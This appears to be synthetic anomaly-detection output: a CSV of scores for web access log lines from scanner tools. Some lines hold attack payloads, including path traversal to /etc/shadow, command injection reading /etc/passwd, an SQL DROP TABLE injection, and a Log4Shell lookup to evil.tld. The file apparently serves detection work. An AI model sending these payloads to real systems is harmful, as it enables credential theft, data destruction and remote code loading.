score_content,score_session,score_fused,score_fused_norm,line
104.7623062133789,,104.7623062133789,104.7623062133789,196.214.252.141 - - [10/Jan/2025:12:28:02 +0000] "TRACE /profile HTTP/1.1" 200 12787 "-" "sqlmap/1.7.2#stable"
0.14929239451885223,,0.14929239451885223,0.14929239451885223,197.122.148.134 - - [10/Jan/2025:12:28:04 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 204 1328 "https://twitter.com/" "dirb/2.22"
1.8927310705184937,,1.8927310705184937,1.8927310705184937,145.221.177.95 - - [10/Jan/2025:12:28:06 +0000] "GET /dashboard HTTP/1.1" 200 929 "https://twitter.com/" "sqlmap/1.7.2#stable"
24.395885467529297,,24.395885467529297,24.395885467529297,176.240.3.100 - - [10/Jan/2025:12:28:07 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 686 "https://example.com/" "python-requests/2.31.0"
0.2624164819717407,,0.2624164819717407,0.2624164819717407,48.6.96.46 - - [10/Jan/2025:12:28:08 +0000] "GET /assets/app.js HTTP/1.1" 200 9592 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
13.417620658874512,,13.417620658874512,13.417620658874512,219.139.68.67 - - [10/Jan/2025:12:28:09 +0000] "PUT /contact HTTP/1.1" 200 12187 "https://twitter.com/" "python-requests/2.31.0"
30129.400390625,,30129.400390625,30129.400390625,90.250.32.160 - - [10/Jan/2025:12:28:10 +0000] "POST /contact HTTP/1.1" 403 1486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30220.029296875,,30220.029296875,30220.029296875,182.163.192.191 - - [10/Jan/2025:12:28:13 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1117 "https://twitter.com/" "curl/7.85.0"
27.278409957885742,,27.278409957885742,27.278409957885742,229.114.48.118 - - [10/Jan/2025:12:28:15 +0000] "POST /search?q=phone HTTP/1.1" 200 9458 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.114560127258301,,3.114560127258301,3.114560127258301,213.58.244.42 - - [10/Jan/2025:12:28:16 +0000] "POST /wp-login.php HTTP/1.1" 200 573 "https://www.google.com/" "curl/7.85.0"
11084.787109375,,11084.787109375,11084.787109375,67.46.82.247 - - [10/Jan/2025:12:28:19 +0000] "HEAD /dashboard HTTP/1.1" 503 1417 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11041.8583984375,,11041.8583984375,11041.8583984375,1.213.7.30 - - [10/Jan/2025:12:28:19 +0000] "POST /api/products HTTP/1.1" 500 260 "https://twitter.com/" "dirb/2.22"
27.293590545654297,,27.293590545654297,27.293590545654297,29.244.248.119 - - [10/Jan/2025:12:28:19 +0000] "POST /search?q=ssd HTTP/1.1" 200 1997 "https://example.com/" "python-requests/2.31.0"
7.617457389831543,,7.617457389831543,7.617457389831543,14.103.67.235 - - [10/Jan/2025:12:28:22 +0000] "POST /dashboard HTTP/1.1" 301 5606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
35.8939094543457,,35.8939094543457,35.8939094543457,196.64.22.135 - - [10/Jan/2025:12:28:22 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9893 "https://twitter.com/" "sqlmap/1.7.2#stable"
127.171630859375,,127.171630859375,127.171630859375,134.86.79.125 - - [10/Jan/2025:12:28:24 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 12157 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.087867736816406,,50.087867736816406,50.087867736816406,94.35.96.24 - - [10/Jan/2025:12:28:25 +0000] "DELETE /search?q=phone HTTP/1.1" 200 4496 "https://news.ycombinator.com/" "curl/7.85.0"
5.1949286460876465,,5.1949286460876465,5.1949286460876465,234.51.38.92 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 304 7504 "https://twitter.com/" "dirb/2.22"
2.2635488510131836,,2.2635488510131836,2.2635488510131836,177.42.225.26 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 200 4824 "-" "sqlmap/1.7.2#stable"
30197.931640625,,30197.931640625,30197.931640625,156.61.16.146 - - [10/Jan/2025:12:28:27 +0000] "OPTIONS /api/products HTTP/1.1" 403 135 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.089820146560669,,3.089820146560669,3.089820146560669,229.129.36.228 - - [10/Jan/2025:12:28:29 +0000] "GET /assets/app.css HTTP/1.1" 301 8159 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.27300453186035,,27.27300453186035,27.27300453186035,212.101.46.134 - - [10/Jan/2025:12:28:30 +0000] "POST /search?q=camera HTTP/1.1" 200 13939 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
74.3624496459961,,74.3624496459961,74.3624496459961,13.245.154.145 - - [10/Jan/2025:12:28:33 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 301 2307 "https://www.google.com/" "sqlmap/1.7.2#stable"
3.1266098022460938,,3.1266098022460938,3.1266098022460938,1.24.46.38 - - [10/Jan/2025:12:28:35 +0000] "GET /assets/app.css HTTP/1.1" 302 12188 "https://example.com/" "nikto/2.5.0"
0.291654109954834,,0.291654109954834,0.291654109954834,231.90.73.98 - - [10/Jan/2025:12:28:36 +0000] "GET /assets/app.js HTTP/1.1" 200 17518 "https://example.com/" "dirb/2.22"
27.251184463500977,,27.251184463500977,27.251184463500977,27.28.103.110 - - [10/Jan/2025:12:28:37 +0000] "GET /api/product?id=123 HTTP/1.1" 301 1575 "https://www.google.com/" "dirb/2.22"
127.16342163085938,,127.16342163085938,127.16342163085938,130.235.168.18 - - [10/Jan/2025:12:28:39 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 5486 "-" "sqlmap/1.7.2#stable"
50.12321472167969,,50.12321472167969,50.12321472167969,53.176.117.162 - - [10/Jan/2025:12:28:41 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18696 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
2.048927068710327,,2.048927068710327,2.048927068710327,85.32.24.110 - - [10/Jan/2025:12:28:44 +0000] "GET /logout HTTP/1.1" 200 14011 "https://news.ycombinator.com/" "curl/7.85.0"
7.804234027862549,,7.804234027862549,7.804234027862549,162.200.186.94 - - [10/Jan/2025:12:28:46 +0000] "POST /login HTTP/1.1" 304 2454 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.7117805480957,,47.7117805480957,47.7117805480957,131.252.101.106 - - [10/Jan/2025:12:28:49 +0000] "HEAD /admin HTTP/1.1" 200 4779 "https://news.ycombinator.com/" "nikto/2.5.0"
3.154086112976074,,3.154086112976074,3.154086112976074,190.208.232.114 - - [10/Jan/2025:12:28:51 +0000] "GET /assets/app.js HTTP/1.1" 302 12875 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.777449131011963,,4.777449131011963,4.777449131011963,242.157.6.202 - - [10/Jan/2025:12:28:52 +0000] "POST /phpmyadmin HTTP/1.1" 200 18272 "-" "curl/7.85.0"
73.3023910522461,,73.3023910522461,73.3023910522461,44.213.230.167 - - [10/Jan/2025:12:28:54 +0000] "OPTIONS /api/products HTTP/1.1" 204 16504 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0007851123809814,,2.0007851123809814,2.0007851123809814,172.48.99.105 - - [10/Jan/2025:12:28:56 +0000] "GET /logout HTTP/1.1" 200 751 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.545598566532135,,0.545598566532135,0.545598566532135,79.179.212.145 - - [10/Jan/2025:12:28:59 +0000] "GET /.env HTTP/1.1" 200 6127 "-" "curl/7.85.0"
95.73033905029297,,95.73033905029297,95.73033905029297,251.150.122.184 - - [10/Jan/2025:12:29:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 3296 "-" "curl/7.85.0"
24.382356643676758,,24.382356643676758,24.382356643676758,222.120.156.112 - - [10/Jan/2025:12:29:03 +0000] "GET /search?q=router HTTP/1.1" 200 5370 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
104.7989730834961,,104.7989730834961,104.7989730834961,33.37.231.234 - - [10/Jan/2025:12:29:04 +0000] "TRACE /about HTTP/1.1" 200 4434 "https://www.google.com/" "python-requests/2.31.0"
73.34799194335938,,73.34799194335938,73.34799194335938,217.208.119.175 - - [10/Jan/2025:12:29:04 +0000] "OPTIONS /contact HTTP/1.1" 200 9117 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
35.903663635253906,,35.903663635253906,35.903663635253906,182.145.40.3 - - [10/Jan/2025:12:29:05 +0000] "PUT /search?q=ssd HTTP/1.1" 200 12279 "https://news.ycombinator.com/" "dirb/2.22"
73.0371322631836,,73.0371322631836,73.0371322631836,134.11.59.161 - - [10/Jan/2025:12:29:05 +0000] "HEAD /search?q=ssd HTTP/1.1" 302 13918 "https://news.ycombinator.com/" "nikto/2.5.0"
30.508642196655273,,30.508642196655273,30.508642196655273,207.246.203.39 - - [10/Jan/2025:12:29:08 +0000] "DELETE /api/products HTTP/1.1" 302 15219 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.77227020263672,,95.77227020263672,95.77227020263672,47.4.23.237 - - [10/Jan/2025:12:29:08 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12039 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
70.13639831542969,,70.13639831542969,70.13639831542969,74.111.83.242 - - [10/Jan/2025:12:29:08 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 7486 "-" "Wget/1.21.2 (linux-gnu)"
24.43602752685547,,24.43602752685547,24.43602752685547,239.181.50.1 - - [10/Jan/2025:12:29:08 +0000] "GET /search?q=phone HTTP/1.1" 200 12094 "https://news.ycombinator.com/" "python-requests/2.31.0"
30148.619140625,,30148.619140625,30148.619140625,103.242.109.145 - - [10/Jan/2025:12:29:11 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1293 "https://twitter.com/" "nikto/2.5.0"
3.18353271484375,,3.18353271484375,3.18353271484375,203.140.35.109 - - [10/Jan/2025:12:29:13 +0000] "GET /assets/app.css HTTP/1.1" 304 16963 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.2565920352935791,,0.2565920352935791,0.2565920352935791,247.232.150.69 - - [10/Jan/2025:12:29:16 +0000] "GET /assets/app.css HTTP/1.1" 200 14467 "https://example.com/" "sqlmap/1.7.2#stable"
4.743327617645264,,4.743327617645264,4.743327617645264,222.103.42.79 - - [10/Jan/2025:12:29:19 +0000] "POST /api/products HTTP/1.1" 200 1089 "https://example.com/" "python-requests/2.31.0"
3.2176764011383057,,3.2176764011383057,3.2176764011383057,235.78.159.128 - - [10/Jan/2025:12:29:20 +0000] "GET /assets/app.js HTTP/1.1" 304 19977 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
103.07148742675781,,103.07148742675781,103.07148742675781,104.64.113.158 - - [10/Jan/2025:12:29:23 +0000] "TRACE /.git/config HTTP/1.1" 200 11267 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.78192138671875,,35.78192138671875,35.78192138671875,24.132.120.119 - - [10/Jan/2025:12:29:24 +0000] "PUT /search?q=router HTTP/1.1" 200 2335 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.2046179175376892,,0.2046179175376892,0.2046179175376892,196.35.48.254 - - [10/Jan/2025:12:29:27 +0000] "GET /../../etc/passwd HTTP/1.1" 201 13006 "https://www.google.com/" "dirb/2.22"
30.57465362548828,,30.57465362548828,30.57465362548828,57.112.231.252 - - [10/Jan/2025:12:29:29 +0000] "DELETE /profile HTTP/1.1" 302 14933 "https://news.ycombinator.com/" "curl/7.85.0"
38.78245544433594,,38.78245544433594,38.78245544433594,75.144.124.22 - - [10/Jan/2025:12:29:29 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 14085 "https://news.ycombinator.com/" "curl/7.85.0"
13.466835975646973,,13.466835975646973,13.466835975646973,106.178.201.205 - - [10/Jan/2025:12:29:29 +0000] "PUT /login HTTP/1.1" 200 6365 "https://example.com/" "curl/7.85.0"
4.845337390899658,,4.845337390899658,4.845337390899658,36.254.182.156 - - [10/Jan/2025:12:29:30 +0000] "POST /contact HTTP/1.1" 200 9514 "https://news.ycombinator.com/" "nikto/2.5.0"
47.68479919433594,,47.68479919433594,47.68479919433594,18.82.85.177 - - [10/Jan/2025:12:29:31 +0000] "HEAD /logout HTTP/1.1" 200 6979 "https://twitter.com/" "sqlmap/1.7.2#stable"
27.72686004638672,,27.72686004638672,27.72686004638672,15.146.106.161 - - [10/Jan/2025:12:29:32 +0000] "DELETE /login HTTP/1.1" 204 5387 "https://example.com/" "curl/7.85.0"
5.9852294921875,,5.9852294921875,5.9852294921875,97.139.36.128 - - [10/Jan/2025:12:29:32 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 15579 "https://example.com/" "nikto/2.5.0"
2.0460846424102783,,2.0460846424102783,2.0460846424102783,111.192.52.101 - - [10/Jan/2025:12:29:32 +0000] "GET /logout HTTP/1.1" 200 13233 "-" "python-requests/2.31.0"
50.04281997680664,,50.04281997680664,50.04281997680664,120.25.29.213 - - [10/Jan/2025:12:29:32 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 4434 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.72124481201172,,95.72124481201172,95.72124481201172,236.188.227.29 - - [10/Jan/2025:12:29:33 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.65945053100586,,47.65945053100586,47.65945053100586,61.45.54.147 - - [10/Jan/2025:12:29:33 +0000] "HEAD /logout HTTP/1.1" 200 1813 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30.631452560424805,,30.631452560424805,30.631452560424805,217.102.33.71 - - [10/Jan/2025:12:29:33 +0000] "DELETE /login HTTP/1.1" 301 15365 "https://example.com/" "sqlmap/1.7.2#stable"
5.231857776641846,,5.231857776641846,5.231857776641846,45.224.185.247 - - [10/Jan/2025:12:29:36 +0000] "GET / HTTP/1.1" 304 16920 "https://example.com/" "python-requests/2.31.0"
24.428508758544922,,24.428508758544922,24.428508758544922,196.27.251.128 - - [10/Jan/2025:12:29:38 +0000] "GET /search?q=phone HTTP/1.1" 200 10234 "https://example.com/" "sqlmap/1.7.2#stable"
0.5687347650527954,,0.5687347650527954,0.5687347650527954,236.16.65.91 - - [10/Jan/2025:12:29:39 +0000] "GET /.env HTTP/1.1" 200 11230 "https://example.com/" "python-requests/2.31.0"
50.11833572387695,,50.11833572387695,50.11833572387695,24.38.7.173 - - [10/Jan/2025:12:29:42 +0000] "DELETE /search?q=camera HTTP/1.1" 200 17155 "https://twitter.com/" "python-requests/2.31.0"
2.2685484886169434,,2.2685484886169434,2.2685484886169434,200.100.26.214 - - [10/Jan/2025:12:29:45 +0000] "GET / HTTP/1.1" 200 5776 "-" "sqlmap/1.7.2#stable"
2.3178517818450928,,2.3178517818450928,2.3178517818450928,70.155.80.238 - - [10/Jan/2025:12:29:47 +0000] "GET / HTTP/1.1" 200 18121 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.39060974121094,,73.39060974121094,73.39060974121094,31.131.243.81 - - [10/Jan/2025:12:29:47 +0000] "OPTIONS /about HTTP/1.1" 200 934 "https://example.com/" "python-requests/2.31.0"
30125.9921875,,30125.9921875,30125.9921875,188.157.227.229 - - [10/Jan/2025:12:29:47 +0000] "GET /assets/app.js HTTP/1.1" 429 437 "https://twitter.com/" "nikto/2.5.0"
0.25294744968414307,,0.25294744968414307,0.25294744968414307,237.112.104.250 - - [10/Jan/2025:12:29:49 +0000] "GET /assets/app.css HTTP/1.1" 200 13455 "https://news.ycombinator.com/" "nikto/2.5.0"
2.012580156326294,,2.012580156326294,2.012580156326294,220.87.186.55 - - [10/Jan/2025:12:29:50 +0000] "GET /contact HTTP/1.1" 200 14093 "https://www.google.com/" "curl/7.85.0"
49.170162200927734,,49.170162200927734,49.170162200927734,26.103.4.115 - - [10/Jan/2025:12:29:52 +0000] "HEAD /.env HTTP/1.1" 304 18058 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
4.949365615844727,,4.949365615844727,4.949365615844727,129.106.139.180 - - [10/Jan/2025:12:29:55 +0000] "POST /login HTTP/1.1" 200 17351 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.247220993041992,,27.247220993041992,27.247220993041992,122.237.107.65 - - [10/Jan/2025:12:29:58 +0000] "POST /search?q=phone HTTP/1.1" 204 4484 "https://example.com/" "sqlmap/1.7.2#stable"
70.05068969726562,,70.05068969726562,70.05068969726562,107.22.55.80 - - [10/Jan/2025:12:30:01 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 9746 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
5.126964092254639,,5.126964092254639,5.126964092254639,31.210.38.239 - - [10/Jan/2025:12:30:01 +0000] "GET / HTTP/1.1" 302 1570 "https://www.google.com/" "curl/7.85.0"
47.58633804321289,,47.58633804321289,47.58633804321289,2.119.195.233 - - [10/Jan/2025:12:30:03 +0000] "HEAD /api/products HTTP/1.1" 200 8052 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.11323547363281,,49.11323547363281,49.11323547363281,136.203.94.103 - - [10/Jan/2025:12:30:03 +0000] "HEAD /.env HTTP/1.1" 302 13092 "https://www.google.com/" "python-requests/2.31.0"
0.288453072309494,,0.288453072309494,0.288453072309494,192.175.223.35 - - [10/Jan/2025:12:30:03 +0000] "GET /assets/app.js HTTP/1.1" 200 16525 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
127.26431274414062,,127.26431274414062,127.26431274414062,238.68.14.65 - - [10/Jan/2025:12:30:06 +0000] "TRACE /search?q=ssd HTTP/1.1" 201 17865 "https://news.ycombinator.com/" "nikto/2.5.0"
24.331745147705078,,24.331745147705078,24.331745147705078,9.76.188.86 - - [10/Jan/2025:12:30:06 +0000] "GET /search?q=headphones HTTP/1.1" 200 10819 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
72.97010040283203,,72.97010040283203,72.97010040283203,241.214.121.102 - - [10/Jan/2025:12:30:06 +0000] "HEAD /search?q=laptop HTTP/1.1" 304 6409 "https://twitter.com/" "dirb/2.22"
35.80058288574219,,35.80058288574219,35.80058288574219,26.96.107.250 - - [10/Jan/2025:12:30:07 +0000] "PUT /search?q=camera HTTP/1.1" 200 5949 "https://www.google.com/" "curl/7.85.0"
27.158754348754883,,27.158754348754883,27.158754348754883,198.178.94.26 - - [10/Jan/2025:12:30:09 +0000] "POST /search?q=headphones HTTP/1.1" 200 5229 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.2488018125295639,,0.2488018125295639,0.2488018125295639,102.118.47.80 - - [10/Jan/2025:12:30:09 +0000] "GET /assets/app.css HTTP/1.1" 200 12351 "https://twitter.com/" "dirb/2.22"
27.15222930908203,,27.15222930908203,27.15222930908203,96.112.43.55 - - [10/Jan/2025:12:30:10 +0000] "POST /search?q=headphones HTTP/1.1" 204 5274 "https://twitter.com/" "dirb/2.22"
47.46882247924805,,47.46882247924805,47.46882247924805,58.148.141.116 - - [10/Jan/2025:12:30:10 +0000] "HEAD /server-status HTTP/1.1" 200 8113 "-" "dirb/2.22"
95.8171157836914,,95.8171157836914,95.8171157836914,17.226.51.23 - - [10/Jan/2025:12:30:12 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 3382 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.500066757202148,,13.500066757202148,13.500066757202148,91.64.104.245 - - [10/Jan/2025:12:30:12 +0000] "PUT /about HTTP/1.1" 200 14184 "https://www.google.com/" "sqlmap/1.7.2#stable"
30124.744140625,,30124.744140625,30124.744140625,90.39.164.251 - - [10/Jan/2025:12:30:14 +0000] "GET /assets/app.css HTTP/1.1" 401 406 "https://example.com/" "python-requests/2.31.0"
73.33637237548828,,73.33637237548828,73.33637237548828,7.161.20.236 - - [10/Jan/2025:12:30:14 +0000] "OPTIONS /contact HTTP/1.1" 200 6662 "https://example.com/" "sqlmap/1.7.2#stable"
2.2798011302948,,2.2798011302948,2.2798011302948,109.212.242.252 - - [10/Jan/2025:12:30:17 +0000] "GET / HTTP/1.1" 200 8064 "https://www.google.com/" "curl/7.85.0"
127.15520477294922,,127.15520477294922,127.15520477294922,143.124.73.160 - - [10/Jan/2025:12:30:19 +0000] "TRACE /search?q=camera HTTP/1.1" 200 8312 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.38750457763672,,73.38750457763672,73.38750457763672,8.153.173.139 - - [10/Jan/2025:12:30:20 +0000] "OPTIONS /admin HTTP/1.1" 200 1447 "-" "curl/7.85.0"
127.20040893554688,,127.20040893554688,127.20040893554688,128.43.30.98 - - [10/Jan/2025:12:30:20 +0000] "TRACE /search?q=phone HTTP/1.1" 200 13620 "https://www.google.com/" "dirb/2.22"
30229.423828125,,30229.423828125,30229.423828125,230.99.208.168 - - [10/Jan/2025:12:30:23 +0000] "TRACE /about HTTP/1.1" 403 699 "https://example.com/" "nikto/2.5.0"
27.647672653198242,,27.647672653198242,27.647672653198242,205.109.7.10 - - [10/Jan/2025:12:30:24 +0000] "DELETE /profile HTTP/1.1" 204 4611 "https://example.com/" "sqlmap/1.7.2#stable"
47.742374420166016,,47.742374420166016,47.742374420166016,11.223.235.89 - - [10/Jan/2025:12:30:24 +0000] "HEAD /admin HTTP/1.1" 200 11281 "https://www.google.com/" "python-requests/2.31.0"
52.87925720214844,,52.87925720214844,52.87925720214844,9.225.128.105 - - [10/Jan/2025:12:30:25 +0000] "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 6566 "-" "curl/7.85.0"
3.287612199783325,,3.287612199783325,3.287612199783325,62.12.202.156 - - [10/Jan/2025:12:30:25 +0000] "GET /index.html HTTP/1.1" 304 15336 "https://twitter.com/" "python-requests/2.31.0"
